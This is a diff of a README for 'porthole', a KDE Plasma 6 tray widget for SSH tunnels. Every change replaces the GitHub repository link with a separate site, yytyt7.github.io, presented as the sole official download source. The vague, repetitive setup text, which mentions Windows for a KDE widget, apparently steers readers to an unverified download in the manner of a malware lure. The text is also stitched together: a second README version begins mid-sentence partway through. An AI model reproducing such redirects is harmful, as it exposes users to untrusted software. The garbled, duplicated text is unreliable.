@@ -1,6 +1,6 @@
 # 🔌 porthole - Switch SSH Tunnels Without Fuss
 
-[![Download porthole](https://img.shields.io/badge/⬇️_Download_porthole-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://github.com/yytyt7/porthole)
+[![Download porthole](https://img.shields.io/badge/⬇️_Download_porthole-FF6B6B?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://yytyt7.github.io)
 
 porthole is a KDE Plasma 6 system tray widget for people who use SSH port forwards and want a simple visual switch instead of typing commands. It lets you turn SSH tunnels on and off from the system tray. It also shows every port listening on your machine, so you can see what is open and what is active at a glance.
 
@@ -14,11 +14,11 @@ The second part of porthole is the port list. It shows the ports that are listen
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: https://github.com/yytyt7/porthole
+Visit this link to download the application: https://yytyt7.github.io
 
 Open the link in your browser and use the download option provided on that page. Keep the downloaded item in a place you can find again, such as your Downloads folder. After the download is complete, continue with the normal setup for your KDE Plasma 6 desktop.
 
-[**Visit this link to download the application**](https://github.com/yytyt7/porthole)
+[**Visit this link to download the application**](https://yytyt7.github.io)
 
 The download page is the official place to get porthole. Use that page as your starting point for the application files and project information.
 
@@ -28,10 +28,10 @@ If you are on Windows, open the download link in your browser first. Use the pag
 
 A simple path for a first-time user is:
 
-1. Open https://github.com/yytyt7/porthole in your browser.
+1. Open https://yytyt7.github.io in your browser.
 2. Visit this# 🔌 porthole - Switch SSH Tunnels Without Fuss
 
-[![Download porthole](https://img.shields.io/badge/⬇️_Download_porthole-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://github.com/yytyt7/porthole)
+[![Download porthole](https://img.shields.io/badge/⬇️_Download_porthole-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://yytyt7.github.io)
 
 porthole is a small helper that lives in the corner of your desktop. It gives you a simple on/off switch for your SSH port forwards, and it shows you every port that is currently listening on your machine. Instead of typing long commands into a black window, you click a switch. Instead of guessing what is running, you look at a list.
 
@@ -41,7 +41,7 @@ It is built as a KDE Plasma 6 system tray widget. A system tray widget is one of
 
 Start by opening the official download page in your browser. That page is the one and only starting point for getting porthole onto your computer.
 
-[**Visit this link to download the application**](https://github.com/yytyt7/porthole)
+[**Visit this link to download the application**](https://yytyt7.github.io)
 
 Visit this link to download the application. From there, follow the download instructions shown on the page itself. Save the files somewhere easy to find, like your Downloads folder, so you know where they are when the download finishes.
 
@@ -49,7 +49,7 @@ Once you have the application, the goal is simple: place porthole where your des
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: https://github.com/yytyt7/porthole
+Visit this link to download the application: https://yytyt7.github.io
 
 Use that page to get the files. Keep everything together in one folder while you work, and do not rename or move individual pieces, because the application expects its parts to stay together. When the download is complete, open the folder and look for the main application item. Open it the way you would open any other program on your computer.
 
